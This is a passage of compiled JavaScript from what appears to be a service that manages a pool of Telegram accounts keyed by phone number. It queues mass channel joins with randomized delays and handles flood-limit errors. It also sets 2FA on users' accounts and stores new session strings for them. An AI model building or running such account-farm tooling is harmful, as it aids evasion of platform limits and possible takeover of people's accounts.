            { name: 'tenDays', days: 10, minRequired: 9 }
        ];
        this.ONE_DAY_MS = 24 * 60 * 60 * 1000;
        this.THREE_MONTHS_MS = 3 * 30 * this.ONE_DAY_MS;
        this.INACTIVE_USER_CUTOFF_DAYS = 90;
        this.cleanupIntervalId = null;
    }
    async onModuleDestroy() {
        await this.cleanup();
    }
    async cleanup() {
        try {
            this.clearAllTimeouts();
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            this.clearMemoryCleanup();
            this.clearBufferMap();
            this.clearLeaveMap();
            this.isJoinChannelProcessing = false;
            this.isLeaveChannelProcessing = false;
        }
        catch (error) {
            this.logger.error('Error during cleanup:', error);
        }
    }
    startMemoryCleanup() {
        this.cleanupIntervalId = setInterval(() => {
            this.performMemoryCleanup();
        }, this.CLEANUP_INTERVAL);
        this.activeTimeouts.add(this.cleanupIntervalId);
    }
    clearMemoryCleanup() {
        if (this.cleanupIntervalId) {
            clearInterval(this.cleanupIntervalId);
            this.activeTimeouts.delete(this.cleanupIntervalId);
            this.cleanupIntervalId = null;
        }
    }
    performMemoryCleanup() {
        try {
            for (const [mobile, channels] of this.joinChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    this.logger.log(`Cleaning up joinChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.joinChannelMap.delete(mobile);
                }
            }
            for (const [mobile, channels] of this.leaveChannelMap.entries()) {
                if (!channels || channels.length === 0) {
                    this.logger.log(`Cleaning up leaveChannelMap entry for mobile: ${mobile} as channels : ${channels}`);
                    this.leaveChannelMap.delete(mobile);
                }
            }
            if (this.joinChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.joinChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach((key) => this.joinChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from joinChannelMap to prevent memory leak`);
            }
            if (this.leaveChannelMap.size > this.MAX_MAP_SIZE) {
                const keysToRemove = Array.from(this.leaveChannelMap.keys()).slice(this.MAX_MAP_SIZE);
                keysToRemove.forEach((key) => this.leaveChannelMap.delete(key));
                this.logger.warn(`Cleaned up ${keysToRemove.length} entries from leaveChannelMap to prevent memory leak`);
            }
            this.logger.debug(`Map Memory Check completed. Maps sizes - Join: ${this.joinChannelMap.size}, Leave: ${this.leaveChannelMap.size}, Active timeouts: ${this.activeTimeouts.size}`);
        }
        catch (error) {
            this.logger.error('Error during memory cleanup:', error);
        }
    }
    createTimeout(callback, delay) {
        const timeout = setTimeout(() => {
            this.activeTimeouts.delete(timeout);
            callback();
        }, delay);
        this.activeTimeouts.add(timeout);
        return timeout;
    }
    clearAllTimeouts() {
        this.activeTimeouts.forEach((timeout) => {
            clearTimeout(timeout);
        });
        this.activeTimeouts.clear();
        this.logger.debug('Cleared all active timeouts');
    }
    async safeUnregisterClient(mobile) {
        try {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
        catch (unregisterError) {
            const errorMessage = unregisterError instanceof Error ? unregisterError.message : 'Unknown error';
            this.logger.error(`Error unregistering client ${mobile}: ${errorMessage}`);
        }
    }
    handleError(error, context, mobile) {
        const contextWithMobile = mobile ? `${context}: ${mobile}` : context;
        return (0, parseError_1.parseError)(error, contextWithMobile, false);
    }
    async create(bufferClient) {
        const result = await this.bufferClientModel.create({
            ...bufferClient,
            status: bufferClient.status || 'active',
        });
        this.logger.log(`Buffer Client Created:\n\nMobile: ${bufferClient.mobile}`);
        this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `Buffer Client Created:\n\nMobile: ${bufferClient.mobile}`);
        return result;
    }
    async findAll(status) {
        const filter = status ? { status } : {};
        return this.bufferClientModel.find(filter).exec();
    }
    async findOne(mobile, throwErr = true) {
        const bufferClient = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!bufferClient && throwErr) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return bufferClient;
    }
    async update(mobile, updateClientDto) {
        const updatedBufferClient = await this.bufferClientModel
            .findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, returnDocument: 'after' })
            .exec();
        if (!updatedBufferClient) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return updatedBufferClient;
    }
    async createOrUpdate(mobile, createorUpdateBufferClientDto) {
        const existingBufferClient = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingBufferClient) {
            this.logger.log('Updating existing Client');
            return this.update(existingBufferClient.mobile, createorUpdateBufferClientDto);
        }
        else {
            this.logger.log('creating new Client');
            const createDto = {
                ...createorUpdateBufferClientDto,
                status: createorUpdateBufferClientDto.status || 'active',
            };
            return this.create(createDto);
        }
    }
    async remove(mobile, message) {
        try {
            const bufferClient = await this.findOne(mobile, false);
            if (!bufferClient) {
                throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
            }
            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\n${message}`)}`);
            await this.bufferClientModel.deleteOne({ mobile }).exec();
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `failed to delete BufferClient: ${mobile}`);
            this.logger.error(`Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);
    }
    async search(filter) {
        if (filter.tgId === "refresh") {
            this.updateAllClientSessions().catch((error) => {
                this.logger.error('Error updating all client sessions:', error);
            });
            return [];
        }
        return await this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        if (!query) {
            throw new common_1.BadRequestException('Query is invalid.');
        }
        try {
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
            throw new common_1.InternalServerErrorException(`Query execution failed: ${errorMessage}`);
        }
    }
    removeFromBufferMap(key) {
        this.joinChannelMap.delete(key);
    }
    safeSetJoinChannelMap(mobile, channels) {
        if (this.joinChannelMap.size >= this.MAX_MAP_SIZE &&
            !this.joinChannelMap.has(mobile)) {
            this.logger.warn(`Join channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`);
            return false;
        }
        this.joinChannelMap.set(mobile, channels);
        return true;
    }
    safeSetLeaveChannelMap(mobile, channels) {
        if (this.leaveChannelMap.size >= this.MAX_MAP_SIZE &&
            !this.leaveChannelMap.has(mobile)) {
            this.logger.warn(`Leave channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`);
            return false;
        }
        this.leaveChannelMap.set(mobile, channels);
        return true;
    }
    clearBufferMap() {
        const mapSize = this.joinChannelMap.size;
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
        this.logger.debug(`BufferMap cleared, removed ${mapSize} entries`);
    }
    async updateStatus(mobile, status, message) {
        const updateData = { status };
        if (message) {
            updateData.message = message;
        }
        await this.botsService.sendMessageByCategory(bots_1.ChannelCategory.ACCOUNT_NOTIFICATIONS, `Buffer Client:\n\nStatus Updated to ${status}\nMobile: ${mobile}\nReason: ${message || ''}`);
        return await this.update(mobile, updateData);
    }
    async markAsInactive(mobile, reason) {
        try {
            this.logger.log(`Marking buffer client ${mobile} as inactive: ${reason}`);
            return await this.updateStatus(mobile, 'inactive', reason);
        }
        catch (error) {
            const errorMessage = error instanceof Error ? error.message : 'Unknown error';
            this.logger.error(`Failed to mark buffer client ${mobile} as inactive: ${errorMessage}`);
            return null;
        }
    }
    async updateInfo() {
        const clients = await this.bufferClientModel
            .find({
            status: 'active',
            lastChecked: { $lt: new Date(Date.now() - 7 * this.ONE_DAY_MS) }
        })
            .sort({ channels: 1 })
            .limit(25);
        this.logger.debug(`Updating info for ${clients.length} buffer clients`);
        const now = Date.now();
        for (let i = 0; i < clients.length; i++) {
            const client = clients[i];
            const mobile = client.mobile;
            this.logger.info(`Updating info for client ${i + 1}/${clients.length}: ${mobile}`);
            const lastChecked = client.lastChecked
                ? new Date(client.lastChecked).getTime()
                : 0;
            await this.performHealthCheck(mobile, lastChecked, now);
            if (i < clients.length - 1) {
                await (0, Helpers_1.sleep)(12000 + Math.random() * 8000);
            }
        }
        this.logger.debug('Completed updating info for all buffer clients');
    }
    async joinchannelForBufferClients(skipExisting = true, clientId) {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
            return 'Active client setup exists, skipping buffer promotion';
        }
        this.logger.log('Starting join channel process for buffer clients');
        this.joinChannelMap.clear();
        this.leaveChannelMap.clear();
        this.clearJoinChannelInterval();
        this.clearLeaveChannelInterval();
        await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
        const existingKeys = skipExisting
            ? []
            : Array.from(this.joinChannelMap.keys());
        const query = {
            channels: { $lt: 350 },
            mobile: { $nin: existingKeys },
            status: 'active',
        };
        if (clientId) {
            query.clientId = clientId;
        }
        const clients = await this.bufferClientModel
            .find(query)
            .sort({ channels: 1 })
            .limit(8);
        this.logger.debug(`Found ${clients.length} buffer clients to process`);
        const joinSet = new Set();
        const leaveSet = new Set();
        let successCount = 0;
        let failCount = 0;
        for (let i = 0; i < clients.length; i++) {
            const document = clients[i];
            const mobile = document.mobile;
            this.logger.debug(`Processing buffer client ${i + 1}/${clients.length}: ${mobile}`);
            try {
                const client = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                const channels = await (0, channelinfo_1.channelInfo)(client.client, true);
                this.logger.debug(`Client ${mobile} has ${channels.ids.length} existing channels`);
                await this.update(mobile, { channels: channels.ids.length });
                if (channels.canSendFalseCount < 10) {
                    const excludedIds = channels.ids;
                    const result = channels.ids.length < 220
                        ? await this.activeChannelsService.getActiveChannels(150, 0, excludedIds)
                        : await this.channelsService.getActiveChannels(150, 0, excludedIds);
                    if (!this.joinChannelMap.has(mobile)) {
                        if (this.safeSetJoinChannelMap(mobile, result)) {
                            joinSet.add(mobile);
                            this.logger.debug(`Added ${result.length} channels to join queue for ${mobile}`);
                        }
                        else {
                            this.logger.warn(`Failed to add ${mobile} to join queue due to memory limits`);
                        }
                    }
                    else {
                        this.logger.debug(`${mobile}: Already present in join map, skipping`);
                    }
                    await this.sessionService.getOldestSessionOrCreate({
                        mobile: document.mobile
                    });
                }
                else {
                    if (!this.leaveChannelMap.has(mobile)) {
                        if (this.safeSetLeaveChannelMap(mobile, channels.canSendFalseChats)) {
                            leaveSet.add(mobile);
                            this.logger.warn(`Client ${mobile} has ${channels.canSendFalseChats.length} restricted channels, added to leave queue`);
                        }
                        else {
                            this.logger.warn(`Failed to add ${mobile} to leave queue due to memory limits`);
                        }
                    }
                    else {
                        this.logger.debug(`${mobile}: Already present in leave map, skipping`);
                    }
                }
                successCount++;
            }
            catch (error) {
                failCount++;
                const errorDetails = (0, parseError_1.parseError)(error, `JoinChannelErr: ${mobile}`);
                const errorMsg = errorDetails?.message || error?.errorMessage || 'Unknown error';
                if ((0, isPermanentError_1.default)(errorDetails)) {
                    await this.markAsInactive(mobile, `${errorDetails.message}`);
                }
                else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorMsg}`);
                }
            }
            finally {
                await this.safeUnregisterClient(mobile);
                if (i < clients.length - 1) {
                    await (0, Helpers_1.sleep)(this.CLIENT_PROCESSING_DELAY + Math.random() * 5000);
                }
            }
        }
        await (0, Helpers_1.sleep)(6000 + Math.random() * 3000);
        if (joinSet.size > 0) {
            this.startMemoryCleanup();
            this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);
            this.createTimeout(() => this.joinChannelQueue(), 4000 + Math.random() * 2000);
        }
        if (leaveSet.size > 0) {
            this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);
            this.createTimeout(() => this.leaveChannelQueue(), 10000 + Math.random() * 5000);
        }
        this.logger.log(`Join process complete  Success: ${successCount}, Fail: ${failCount}`);
        return `Buffer Join queued for: ${joinSet.size}, Leave queued for: ${leaveSet.size}`;
    }
    async joinChannelQueue() {
        this.logger.debug('Attempting to start join channel queue');
        if (this.isJoinChannelProcessing) {
            this.logger.warn('Join channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }
        if (!this.joinChannelIntervalId) {
            this.logger.debug('Starting join channel interval');
            this.joinChannelIntervalId = setInterval(async () => {
                await this.processJoinChannelInterval();
            }, this.JOIN_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.joinChannelIntervalId);
            this.createTimeout(() => this.processJoinChannelInterval(), 1000);
        }
        else {
            this.logger.warn('Join channel interval is already running');
        }
    }
    async processJoinChannelInterval() {
        if (this.isJoinChannelProcessing) {
            this.logger.debug('Join channel process already running, skipping interval');
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, clearing interval');
            this.clearJoinChannelInterval();
            return;
        }
        this.isJoinChannelProcessing = true;
        try {
            await this.processJoinChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in join channel queue', error);
        }
        finally {
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size === 0) {
                this.logger.debug('No more channels to join, clearing interval');
                this.clearJoinChannelInterval();
            }
        }
    }
    async processJoinChannelSequentially() {
        const keys = Array.from(this.joinChannelMap.keys());
        this.logger.debug(`Processing join channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            let currentChannel = null;
            try {
                const channels = this.joinChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                    this.removeFromBufferMap(mobile);
                    continue;
                }
                currentChannel = channels.shift();
                if (!currentChannel) {
                    this.logger.debug(`No channel to process for ${mobile}, removing from queue`);
                    this.removeFromBufferMap(mobile);
                    continue;
                }
                this.logger.debug(`${mobile} has ${channels.length} pending channels to join, processing:`, `@${currentChannel.username}`);
                this.joinChannelMap.set(mobile, channels);
                const activeChannel = await this.activeChannelsService.findOne(currentChannel.channelId);
                if (activeChannel && activeChannel.banned === true) {
                    this.logger.debug(`Skipping Channel ${activeChannel.channelId} as it is banned`);
                    await (0, Helpers_1.sleep)(5000 + Math.random() * 3000);
                    continue;
                }
                else {
                    await this.telegramService.tryJoiningChannel(mobile, currentChannel);
                }
            }
            catch (error) {
                const errorDetails = this.handleError(error, `${mobile} ${currentChannel ? `@${currentChannel.username}` : ''} Join Channel Error`, mobile);
                const errorMessage = error instanceof Error ? error.message : 'Unknown error';
                this.logger.error(`Error joining channel for ${mobile}: ${errorMessage}`);
                const errorObj = error;
                if (errorDetails.error === 'FloodWaitError' ||
                    errorObj.errorMessage === 'CHANNELS_TOO_MUCH') {
                    this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                    this.removeFromBufferMap(mobile);
                    try {
                        await (0, Helpers_1.sleep)(10000 + Math.random() * 5000);
                        if (errorObj.errorMessage === 'CHANNELS_TOO_MUCH') {
                            await this.update(mobile, { channels: 400 });
                        }
                        else {
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }
                    }
                    catch (updateError) {
                        this.logger.error(`Error updating channel count for ${mobile}:`, updateError);
                    }
                }
                if ((0, isPermanentError_1.default)(errorDetails)) {
                    this.removeFromBufferMap(mobile);
                    await this.markAsInactive(mobile, `${errorDetails.message}`);
                }
            }
            finally {
                await this.safeUnregisterClient(mobile);
                if (i < keys.length - 1 || this.joinChannelMap.get(mobile)?.length > 0) {
                    await (0, Helpers_1.sleep)(this.CHANNEL_PROCESSING_DELAY + Math.random() * 10000);
                }
                else {
                    this.logger.log(`Not Sleeping before continuing with next Mobile`);
                }
            }
        }
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            clearInterval(this.joinChannelIntervalId);
            this.activeTimeouts.delete(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
        }
        this.isJoinChannelProcessing = false;
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        const mapSize = this.leaveChannelMap.size;
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
        this.logger.debug(`LeaveMap cleared, removed ${mapSize} entries`);
    }
    async leaveChannelQueue() {
        this.logger.debug('Attempting to start leave channel queue');
        if (this.isLeaveChannelProcessing) {
            this.logger.warn('Leave channel process is already running');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        if (!this.leaveChannelIntervalId) {
            this.logger.debug('Starting leave channel interval');
            this.leaveChannelIntervalId = setInterval(async () => {
                await this.processLeaveChannelInterval();
            }, this.LEAVE_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.leaveChannelIntervalId);
            this.createTimeout(() => this.processLeaveChannelInterval(), 1000);
        }
        else {
            this.logger.debug('Leave channel interval is already running');
        }
    }
    async processLeaveChannelInterval() {
        if (this.isLeaveChannelProcessing) {
            this.logger.debug('Leave channel process already running, skipping interval');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, clearing interval');
            this.clearLeaveChannelInterval();
            return;
        }
        this.isLeaveChannelProcessing = true;
        try {
            await this.processLeaveChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in leave channel queue', error);
        }
        finally {
            this.isLeaveChannelProcessing = false;
            if (this.leaveChannelMap.size === 0) {
                this.logger.debug('No more channels to leave, clearing interval');
                this.clearLeaveChannelInterval();
            }
        }
    }
    async processLeaveChannelSequentially() {
        const keys = Array.from(this.leaveChannelMap.keys());
        this.logger.debug(`Processing leave channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            try {
                const channels = this.leaveChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                    this.removeFromLeaveMap(mobile);
                    continue;
                }
                const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                this.logger.debug(`${mobile} has ${channels.length} pending channels to leave, processing ${channelsToProcess.length} channels`);
                if (channels.length > 0) {
                    this.leaveChannelMap.set(mobile, channels);
                }
                else {
                    this.removeFromLeaveMap(mobile);
                }
                const client = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);
                await client.leaveChannels(channelsToProcess);
                this.logger.debug(`${mobile} left ${channelsToProcess.length} channels successfully`);
            }
            catch (error) {
                const errorDetails = this.handleError(error, `${mobile} Leave Channel Error`, mobile);
                if ((0, isPermanentError_1.default)(errorDetails)) {
                    await this.markAsInactive(mobile, `${errorDetails.message}`);
                    this.removeFromLeaveMap(mobile);
                }
                else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorDetails.message}`);
                }
            }
            finally {
                await this.safeUnregisterClient(mobile);
                if (i < keys.length - 1 ||
                    this.leaveChannelMap.get(mobile)?.length > 0) {
                    await (0, Helpers_1.sleep)((this.LEAVE_CHANNEL_INTERVAL / 2) + Math.random() * 60000);
                }
            }
        }
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.activeTimeouts.delete(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsBufferClient(mobile, clientId, availableDate = client_helper_utils_1.ClientHelperUtils.getTodayDateString()) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map((client) => client?.mobile);
        if (clientMobiles.includes(mobile)) {
            throw new common_1.BadRequestException('Number is an Active Client');
        }
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
            autoDisconnect: false
        });
        try {
            await telegramClient.set2fa();
            await (0, Helpers_1.sleep)(30000 + Math.random() * 30000);
            const channels = await this.telegramService.getChannelInfo(mobile, true);
            await (0, Helpers_1.sleep)(5000 + Math.random() * 5000);
            const newSession = await this.telegramService.createNewSession(user.mobile);
            const bufferClient = {
                tgId: user.tgId,
                session: newSession,
                mobile: user.mobile,
                availableDate,
                channels: channels.ids.length,
                clientId,
                status: 'active',
                message: 'Manually configured as buffer client',
                lastUsed: null,
            };
            await this.bufferClientModel
                .findOneAndUpdate({ mobile: user.mobile }, { $set: bufferClient }, { new: true, upsert: true })
                .exec();
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to set as Buffer Client ${mobile}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        await this.safeUnregisterClient(mobile);
        return 'Client set as buffer successfully';
    }
    async checkBufferClients() {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
            return;
        }
        const clients = await this.clientService.findAll();
        const promoteClients = await this.promoteClientService.findAll();
        const clientMainMobiles = clients.map((c) => c.mobile);
        const assignedBufferMobiles = await this.bufferClientModel
            .find({ clientId: { $exists: true }, status: 'active' })
            .distinct('mobile');
        const goodIds = [
            ...clientMainMobiles,
            ...promoteClients.map((c) => c.mobile),
            ...assignedBufferMobiles,
        ].filter(Boolean);
        const bufferClientsPerClient = new Map();
        const bufferClientCounts = await this.bufferClientModel.aggregate([
            {
                $match: {
                    clientId: { $exists: true, $ne: null },
                    status: 'active',
                },
            },
            {
                $group: {
                    _id: '$clientId',
                    count: { $sum: 1 },
                    mobiles: { $push: '$mobile' },
                },
            },
        ]);
        let totalUpdates = 0;
        const MIN_COOLDOWN_HOURS = 2;
        const MAX_UPDATES_PER_CYCLE = 5;
        const now = Date.now();
        this.logger.debug(`Checking buffer clients, good IDs count: ${goodIds.length}`);
        const bufferClientsToProcess = [];
        for (const result of bufferClientCounts) {
            bufferClientsPerClient.set(result._id, result.count);
            const client = clients.find((c) => c.clientId === result._id);
            if (!client) {
                this.logger.warn(`Client with ID ${result._id} not found, skipping buffer clients`);
                continue;
            }
            for (const bufferClientMobile of result.mobiles) {
                const bufferClient = await this.findOne(bufferClientMobile, false);
                if (!bufferClient) {
                    this.logger.warn(`Buffer client ${bufferClientMobile} not found, skipping`);
                    continue;
                }
                if (bufferClient.inUse === true) {
                    this.logger.debug(`Skipping ${bufferClientMobile} - currently in use`);
                    continue;
                }
                const lastChecked = bufferClient.lastChecked
                    ? new Date(bufferClient.lastChecked).getTime()
                    : 0;
                const healthCheckPassed = await this.performHealthCheck(bufferClientMobile, lastChecked, now);
                if (!healthCheckPassed) {
                    this.logger.debug(`${bufferClientMobile} has permanent error, continueing with next buffer client!`);
                    continue;
                }
                if (bufferClient.lastUsed) {
                    const lastUsed = client_helper_utils_1.ClientHelperUtils.getTimestamp(bufferClient.lastUsed);
                    if (lastUsed > 0) {
                        await this.backfillTimestamps(bufferClientMobile, bufferClient, now);
                        this.logger.debug(`Skipping ${bufferClientMobile} - already used, trying timestamps backfill`);
                        continue;
                    }
                }
                const lastUpdateAttempt = bufferClient.lastUpdateAttempt
                    ? new Date(bufferClient.lastUpdateAttempt).getTime()
                    : 0;
                if (lastUpdateAttempt && now - lastUpdateAttempt < MIN_COOLDOWN_HOURS * 60 * 60 * 1000) {
                    const hoursRemaining = ((MIN_COOLDOWN_HOURS * 60 * 60 * 1000) - (now - lastUpdateAttempt)) / (60 * 60 * 1000);
                    this.logger.debug(`Skipping ${bufferClientMobile} - on cooldown, ${hoursRemaining.toFixed(1)} hours remaining`);
                    continue;
                }
                const pendingUpdates = this.getPendingUpdates(bufferClient, now);
                const accountAge = bufferClient.createdAt ? now - new Date(bufferClient.createdAt).getTime() : 0;
                const DAY = this.ONE_DAY_MS;
                const failedAttempts = bufferClient.failedUpdateAttempts || 0;
                const lastAttemptAgeHours = lastUpdateAttempt > 0
                    ? (now - lastUpdateAttempt) / (60 * 60 * 1000)
                    : 10000;
                const priority = (pendingUpdates.totalPending * 10000) +
                    lastAttemptAgeHours +
                    (accountAge / DAY) -
                    (failedAttempts * 100);
                bufferClientsToProcess.push({
                    bufferClient,
                    client,
                    clientId: result._id,
                    priority
                });
            }
        }
        bufferClientsToProcess.sort((a, b) => b.priority - a.priority);
        this.logger.debug(`Processing ${bufferClientsToProcess.length} buffer clients in priority order`);
        for (const { bufferClient, client, clientId } of bufferClientsToProcess) {
            if (totalUpdates >= MAX_UPDATES_PER_CYCLE) {
                this.logger.warn(`Reached total update limit of ${MAX_UPDATES_PER_CYCLE} for this check cycle`);
                break;
            }
            const currentUpdates = await this.processBufferClient(bufferClient, client);
            this.logger.debug(`Processed buffer client ${bufferClient.mobile} for client ${clientId}, current updates: ${currentUpdates} | total updates: ${totalUpdates + currentUpdates}`);
            if (currentUpdates > 0) {
                totalUpdates += currentUpdates;
            }
        }
        const clientNeedingBufferClients = [];
        for (const client of clients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(client.clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingBufferClients.push({
                    clientId: client.clientId,
                    ...availabilityNeeds
                });
            }
        }
        clientNeedingBufferClients.sort((a, b) => a.priority - b.priority);
        let totalSlotsNeeded = 0;
        const clientNeedsMap = new Map();
        for (const clientNeed of clientNeedingBufferClients) {
            const allocated = Math.min(clientNeed.totalNeeded, this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER - totalSlotsNeeded);
            if (allocated > 0) {
                clientNeedsMap.set(clientNeed.clientId, allocated);
                totalSlotsNeeded += allocated;
            }
            if (totalSlotsNeeded >= this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER)
                break;
        }
        this.logger.debug(`Availability-based needs calculated (NO HARD LIMIT):`);
        clientNeedingBufferClients.forEach(need => {
            this.logger.debug(`Client ${need.clientId} (priority: ${need.priority}): ` +
                `${need.totalActive} total active, ${need.totalNeeded} new needed - ${need.calculationReason}`);
            need.windowNeeds.forEach(window => {
                if (window.needed > 0) {
                    this.logger.debug(`  - ${window.window} (${window.targetDate}): ` +
                        `${window.available} available, ${window.needed} needed ` +
                        `(target: ${window.minRequired} per window)`);
                }
                else {
                    this.logger.debug(`  - ${window.window} (${window.targetDate}): ` +
                        `${window.available} available  (sufficient, target: ${window.minRequired})`);
                }
            });
        });
        const totalActiveBufferClients = await this.bufferClientModel.countDocuments({ status: 'active' });
        this.logger.debug(`Total active buffer clients: ${totalActiveBufferClients}`);
        this.logger.debug(`Total slots needed: ${totalSlotsNeeded} (limited to max ${this.MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER} per trigger)`);
        const clientNeedsSummary = clientNeedingBufferClients
            .map(c => `${c.clientId}: ${c.totalNeeded} (${c.calculationReason})`)
            .join('\n');
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Buffer Client Check (Dynamic Availability):\n\nTotal Active Buffer Clients: ${totalActiveBufferClients}\nBuffer Clients Per Client: ${JSON.stringify(Object.fromEntries(bufferClientsPerClient))}\n\nClients Needing Buffer Clients:\n${clientNeedsSummary || 'None'}\n\nTotal Slots Needed: ${totalSlotsNeeded}`)}`);
        if (clientNeedingBufferClients.length > 0 && totalSlotsNeeded > 0) {
            await this.addNewUserstoBufferClientsDynamic([], goodIds, clientNeedingBufferClients, bufferClientsPerClient);
        }
        else {
            this.logger.debug('No new buffer clients needed - all availability windows and total count satisfied');
        }
    }
    async updateUser2FAStatus(tgId, mobile) {
        try {
            await this.usersService.update(tgId, { twoFA: true });
        }
        catch (userUpdateError) {
            this.logger.warn(`Failed to update user 2FA status for ${mobile}:`, userUpdateError);
        }
    }
    async calculateAvailabilityBasedNeeds(clientId) {
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayStr = today.toISOString().split('T')[0];
        const windows = this.AVAILABILITY_WINDOWS.map(window => ({
            ...window,
            targetDate: new Date(today.getTime() + window.days * this.ONE_DAY_MS)
                .toISOString().split('T')[0]
        }));
        const totalActive = await this.bufferClientModel.countDocuments({
            clientId,
            status: 'active'
        });
        const windowNeeds = [];
        let maxNeeded = 0;
        let mostUrgentWindow = '';
        let mostUrgentPriority = 999;
        for (const window of windows) {
            const availableCount = await this.bufferClientModel.countDocuments({
                clientId,
                status: 'active',
                availableDate: { $lte: window.targetDate }
            });
            const needed = Math.max(0, window.minRequired - availableCount);
            windowNeeds.push({
                window: window.name,
                available: availableCount,
                needed,
                targetDate: window.targetDate,
                minRequired: window.minRequired
            });
            if (needed > maxNeeded) {
                maxNeeded = needed;
                mostUrgentWindow = window.name;
                mostUrgentPriority = window.days;
            }
